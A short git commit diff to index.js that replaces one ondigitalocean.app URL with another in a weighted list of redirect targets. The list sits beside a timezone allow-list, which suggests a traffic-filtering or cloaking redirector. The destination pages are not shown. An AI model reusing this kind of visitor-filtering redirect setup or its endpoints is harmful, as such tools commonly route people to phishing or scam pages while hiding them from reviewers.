f9e31cc1442a50b841667cc53ed4471037c01d7b
paalakash <palaksh452@gmail.com>
2026-07-08 09:20:44 +0530

    Update index.js

--- index.js
+++ index.js
@@ -34,7 +34,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://hammerhead-app-q2muk.ondigitalocean.app/werrx01USAHTML/?bcda", weight: 1.0 }
+    { url: "https://king-prawn-app-5d3kn.ondigitalocean.app/werrx01USAHTML/?bcda", weight: 1.0 }
 
 ];
 
